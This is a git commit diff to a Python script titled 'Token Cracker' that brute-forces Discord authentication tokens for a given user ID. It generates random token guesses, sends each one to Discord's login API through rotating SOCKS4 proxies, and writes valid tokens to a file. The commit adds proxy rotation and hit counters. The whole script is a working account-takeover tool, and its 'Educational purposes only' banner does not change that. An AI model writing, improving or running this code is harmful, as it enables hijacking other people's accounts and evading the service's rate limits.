5dfceeef5bde79893a16e019bd67ad986add0e1a
Tung <89498812+tungdo0602@users.noreply.github.com>
2022-01-13 18:37:00 +0700

    Proxy Loaded + title tracker

--- Generator/main.py
+++ Generator/main.py
@@ -6,6 +6,14 @@ import requests
 import colorama
 from colorama import *
 import time
+import console
+from console.utils import set_title
+
+vaild = 0
+invaild = 0
+total_proxy = 0
+bad_proxy = 0
+
 userid = base64.b64encode((input("UserID: ")).encode("ascii"))
 userid = str(userid)[2:-1]
 print("WARNING: Educational purposes only!")
@@ -20,7 +28,8 @@ with open("./proxy/socks4.txt", "r") as file:
 ts = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-_"
 
 while userid == userid:
-
+    total_proxy = len(list(proxies))
+    set_title(f"Token Cracker - Vaild: {vaild} | Invaild: {invaild} | Total Proxies: {total_proxy} | Bad Proxy: {bad_proxy}")
     def HMAC(chars = string.ascii_uppercase + string.digits, N=27):
         return ''.join(random.choice(chars) for _ in range(N))
 
@@ -29,21 +38,24 @@ while userid == userid:
 
     token = userid + '.' + timest(chars=ts) + '.' + HMAC(chars=ts)
     
-    proxy = {'https': 'socks4://'+random.choice(list(proxies))}
+    proxy = random.choice(list(proxies))
+    proxy_form = {'http': f"socks4://{proxy}", 'https': f"socks4://{proxy}"}
 
     headers={
     'Authorization': token
     }
     url = 'https://discordapp.com/api/v9/auth/login'
-    login = requests.get(url, headers=headers)
     try:
+        login = requests.get(url, headers=headers, proxies=proxy_form, timeout=3000)
         if login.status_code == 200:
             print(Fore.GREEN + '[+] VALID' + ' ' + token)
             f = open('done.txt', "a+")
             f.write(f'{token}\n')
+            vaild += 1
             break
         else:
             print(Fore.RED + '[-] INVALID' + ' ' + token)
-    finally:
-        print("")
-input()
+            invaild += 1
+    except:
+        list(proxies).remove(proxy)
+        bad_proxy += 1
